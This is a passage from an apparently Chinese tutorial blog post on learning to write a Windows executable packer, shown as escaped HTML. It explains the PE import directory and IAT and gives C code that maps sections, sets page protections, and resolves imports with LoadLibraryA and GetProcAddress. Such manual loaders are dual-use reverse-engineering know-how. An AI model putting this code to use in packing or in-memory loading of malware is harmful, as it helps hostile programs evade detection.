&lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Set permission for the PE hader to read only
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">oldProtect&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">s_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Characteristics&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// flags are not the same between virtal protect and the section header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_EXECUTE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_EXECUTE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_EXECUTE_READ&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v_perm&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>到此，看起来这个加载其他程序运行的程序可以运行了，但其实还不行。其主要原因之一就是缺乏必要的导入信息。下文详述。&lt;/p>
&lt;h2 id="0x03-导入表">0x03 导入表&lt;/h2>
&lt;h3 id="31-导入表介绍">3.1 导入表介绍&lt;/h3>
&lt;p>在Windows上，每个可执行文件（.exe）都需要一些外部函数来支持其正常运作。这些外部函数通常在我们熟悉的&lt;code>.dll&lt;/code>文件里。举例来说，&lt;code>calc.exe&lt;/code>（计算器程序）需要外部函数来支持打开窗口、显示按钮等。&lt;/p>
&lt;p>以&lt;code>ShellExecuteW&lt;/code>为例（在&lt;code>calc.exe&lt;/code>计算器中被导入），&lt;code>calc.exe&lt;/code>需要这个函数来支持它正常工作（当然，&lt;code>calc.exe&lt;/code>需要不止这一个外部函数），所以&lt;code>calc.exe&lt;/code>需要知道&lt;code>ShellExecuteW&lt;/code>这个函数的代码（机器码）在哪儿。&lt;/p>
&lt;p>但事实上，&lt;code>.dll&lt;/code> 只会在运行时被加载，而且加载后在内存中的位置并不确定。这意味着编译器编译时无从得知&lt;code>ShellExecuteW&lt;/code>的地址（开启ASLR的话就更不可能了），也就无法给调用该函数的&lt;code>call&lt;/code>指令提供正确的立即数地址。&lt;/p>
&lt;p>这就是为什么编译器要创建导入表，因为它期望一旦动态链接库加载完成，它就可以查找到&lt;code>ShellExecuteW&lt;/code>的地址，并在需要的时候调用。&lt;/p>
&lt;p>在调试器里，我们可以看到这样的汇编指令。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-01/call_IAT.jpg"
width="543"
height="125"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-01/call_IAT_hu889b99c9eb0c20be37b0dc63e7aa4f3e_34329_480x0_resize_q75_box.jpg 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-01/call_IAT_hu889b99c9eb0c20be37b0dc63e7aa4f3e_34329_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
alt="import address table"
class="gallery-image"
data-flex-grow="434"
data-flex-basis="1042px"
>&lt;/p>
&lt;p>第一条&lt;code>call&lt;/code>指令是内部调用，调用对象是同一个模块内的函数。编译器知道被调用函数的地址，并使用&lt;code>E8&lt;/code> opcode 。这表示 &lt;em>relative call&lt;/em> 。当调用外部模块时，它调用了从IAT读取的地址，也就是图中&lt;code>ds:[&amp;lt;&amp;amp;ShellExecuteW&amp;gt;]&lt;/code>。&lt;/p>
&lt;p>x86 的 call 分 4 类。&lt;/p>
&lt;ul>
&lt;li>Near, relative (opcode E8) (&lt;code>call func&lt;/code>)&lt;/li>
&lt;li>Far, absolute (opcode 9A) (&lt;code>call 0x12:0x12345678&lt;/code>)&lt;/li>
&lt;li>Near, absolute, indirect (opcode FF /2) (&lt;code>call [edi]&lt;/code>)&lt;/li>
&lt;li>Far, absolute, indirect (opcode FF /3) (&lt;code>call far [edi]&lt;/code>)&lt;/li>
&lt;/ul>
&lt;p>具体问搜索引擎。&lt;/p>
&lt;p>补充，函数可以通过名字（ASCII编码的C字符串）或DLL导出表中的序号 &lt;em>ordinal&lt;/em> 导入。&lt;/p>
&lt;h3 id="32-data-directory-和-idt">3.2 Data Directory 和 IDT&lt;/h3>
&lt;p>说了这么多IAT，那么IAT到底在哪儿？以什么形式保存？还是用&lt;code>pefile&lt;/code>，先看看 PE 文件头中的 &lt;code>OPTIONAL_HEADER .DATA_DIRECTORY&lt;/code>。&lt;/p>
&lt;pre>&lt;code>In [10]: pe.OPTIONAL_HEADER.DATA_DIRECTORY
Out[10]:
[&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_EXPORT] 0x180 0x0 VirtualAddress: 0x0 0x184 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_IMPORT] 0x188 0x0 VirtualAddress: 0xDAA0 0x18C 0x4 Size: 0xC8&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_RESOURCE] 0x190 0x0 VirtualAddress: 0x16000 0x194 0x4 Size: 0x5D0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_EXCEPTION] 0x198 0x0 VirtualAddress: 0x0 0x19C 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_SECURITY] 0x1A0 0x0 VirtualAddress: 0x0 0x1A4 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_BASERELOC] 0x1A8 0x0 VirtualAddress: 0x17000 0x1AC 0x4 Size: 0xE0C&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_DEBUG] 0x1B0 0x0 VirtualAddress: 0x98E0 0x1B4 0x4 Size: 0x38&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_COPYRIGHT] 0x1B8 0x0 VirtualAddress: 0x0 0x1BC 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_GLOBALPTR] 0x1C0 0x0 VirtualAddress: 0x0 0x1C4 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_TLS] 0x1C8 0x0 VirtualAddress: 0x0 0x1CC 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG] 0x1D0 0x0 VirtualAddress: 0x9918 0x1D4 0x4 Size: 0x40&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT] 0x1D8 0x0 VirtualAddress: 0x0 0x1DC 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_IAT] 0x1E0 0x0 VirtualAddress: 0xD000 0x1E4 0x4 Size: 0xAA0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT] 0x1E8 0x0 VirtualAddress: 0x0 0x1EC 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR] 0x1F0 0x0 VirtualAddress: 0x0 0x1F4 0x4 Size: 0x0&amp;gt;,
&amp;lt;Structure: [IMAGE_DIRECTORY_ENTRY_RESERVED] 0x1F8 0x0 VirtualAddress: 0x0 0x1FC 0x4 Size: 0x0&amp;gt;]
&lt;/code>&lt;/pre>&lt;p>&lt;code>Data directory&lt;/code> 实际就是15个结构组成的数组（忽略最后一个reserved），每个结构包含对应的RVA地址和大小（RVA和大小的具体含义之后讨论）。这个结构里我们关注的有&lt;code>IMAGE_DIRECTORY_ENTRY_IMPORT&lt;/code>和&lt;code>IMAGE_DIRECTORY_ENTRY_IAT&lt;/code>，分别指向的是 &lt;em>Import Directory Table&lt;/em> ，&lt;em>IDT&lt;/em> ，和 &lt;em>Import Address Table&lt;/em> ， &lt;em>IAT&lt;/em> 。&lt;/p>
&lt;p>基本是，我们可以这么说， &lt;em>IDT&lt;/em> 指示需要导入哪些函数，这些函数导入后，地址存入 &lt;em>IAT&lt;/em> 。 &lt;em>IDT&lt;/em> 是我们要导入什么， &lt;em>IAT&lt;/em> 是我们导入后把地址放在哪儿。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-01/IDT-IAT.drawio.png"
width="650"
height="1012"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-01/IDT-IAT.drawio_hu519af53fd6ddb5dd0f68ecccb2a04fc7_77938_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-01/IDT-IAT.drawio_hu519af53fd6ddb5dd0f68ecccb2a04fc7_77938_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="IDT-IAT"
class="gallery-image"
data-flex-grow="64"
data-flex-basis="154px"
>&lt;/p>
&lt;p>&lt;em>Import Directory&lt;/em> 指向的是一个 &lt;code>NULL&lt;/code> 结尾的&lt;code>IMAGE_IMPORT_DESCRIPTOR&lt;/code>结构数组。之后在代码里会用到。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_IMAGE_IMPORT_DESCRIPTOR&lt;/span>
&lt;span class="p">{&lt;/span> &lt;span class="n">_ANONYMOUS_UNION&lt;/span> &lt;span class="k">union&lt;/span>
&lt;span class="p">{&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">Characteristics&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">OriginalFirstThunk&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// pointer to dword[]
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="n">DUMMYUNIONNAME&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">TimeDateStamp&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">ForwarderChain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">Name&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// pointer to dll name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">FirstThunk&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// pointer to dword[]
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PIMAGE_IMPORT_DESCRIPTOR&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>OriginalFirstThunk&lt;/code> 和 &lt;code>FirstThunk&lt;/code> 都是指向一个 NULL 结尾的 DWORD 数组。&lt;code>OriginalFirstThunk&lt;/code> 是指向 &lt;em>IDT&lt;/em> &lt;code>DWORD&lt;/code> 数组的 RVA 指针。&lt;/p>
&lt;p>其中数组元素：&lt;/p>
&lt;ul>
&lt;li>如果首比特是1，则这个DWORD是 &lt;em>ordinal&lt;/em> ，函数的导出表序号。&lt;/li>
&lt;li>否则是指向 &lt;code>IMAGE_IMPORT_BY_NAME&lt;/code> 结构的 RVA 地址。&lt;/li>
&lt;/ul>
&lt;p>&lt;code>FirstThunk&lt;/code>指向的是 &lt;em>IAT&lt;/em> ，和 &lt;em>IDT&lt;/em> 结构相同，当我们得到导入函数的地址后，需要把地址放进 &lt;em>IDT&lt;/em> 对应的 &lt;em>IAT&lt;/em> 中。&lt;/p>
&lt;h3 id="33--填充导入表">3.3 填充导入表&lt;/h3>
&lt;p>下面实际编写一下填充 &lt;em>IAT&lt;/em> 的代码。要注意填充 IAT 的代码必须在加载 PE 头和 Sections 之后，早于设置内存保护执行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// load the address of the import descriptors array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">import_descriptors&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>从文件头提取到 Import Directory 的地址（RVA）后，和镜像基址相加算出实际结构地址。接下来开始遍历这个结构。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="c1">// this array is null terminated
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意此处所说的 &lt;em>null terminated&lt;/em> 指的是最后一个数组元素填充了0，故用 &lt;code>OriginalFirstThunk&lt;/code> 判断。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// Get the name of the dll, and import it
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">module_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">import_module&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibraryA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">module_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;import module is null&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>import_descriptors[i].Name&lt;/code> 依然是一个 RVA，指向常量字符串。在这一步之前必须先完成 section 加载，不然取不到字符串。这里用 &lt;code>LoadLibraryA&lt;/code> 加载了 DLL 到内存。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// the lookup table points to function names or ordinals =&amp;gt; it is the IDT
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lookup_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着取 &lt;code>OriginalFirstThunk&lt;/code> 转为 &lt;code>IMAGE_THUNK_DATA&lt;/code> 指针，这就是 &lt;em>IDT&lt;/em> 了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// the address table is a copy of the lookup table at first
&lt;/span>&lt;span class="c1">// but we put the addresses of the loaded function inside =&amp;gt; that&amp;#39;s the IAT
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">address_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">FirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再取 &lt;code>FirstThunk&lt;/code> 转为 &lt;code>IMAGE_THUNK_DATA&lt;/code> 指针，这是 &lt;em>IAT&lt;/em>，之后加载的函数地址会存放到这里。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// null terminated array, again
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后遍历 &lt;em>IDT&lt;/em> ，和遍历 &lt;code>import_descriptors&lt;/code> 时一样，注意 &lt;code>null terminated&lt;/code> 指的是最后一个元素用0填充。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Check the lookup table for the adresse of the function name to import
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_ORDINAL_FLAG&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// if first bit is not 1
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// import by name : get the IMAGE_IMPORT_BY_NAME struct
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">image_import&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this struct points to the ASCII function name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">funct_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_import&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// get that function address from it&amp;#39;s module and name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">funct_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// import by ordinal, directly
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPSTR&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;function handle is null&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// change the IAT, and put the function address inside.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">address_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">function_handle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对每个 &lt;em>IDT&lt;/em> 元素，根据 &lt;em>IDT&lt;/em> 中保存的元素确定加载方式（字符串或者 &lt;em>ordinal&lt;/em>），调用 &lt;code>GetProcAddress&lt;/code> 加载后的地址存入 &lt;em>IAT&lt;/em> 。&lt;/p>
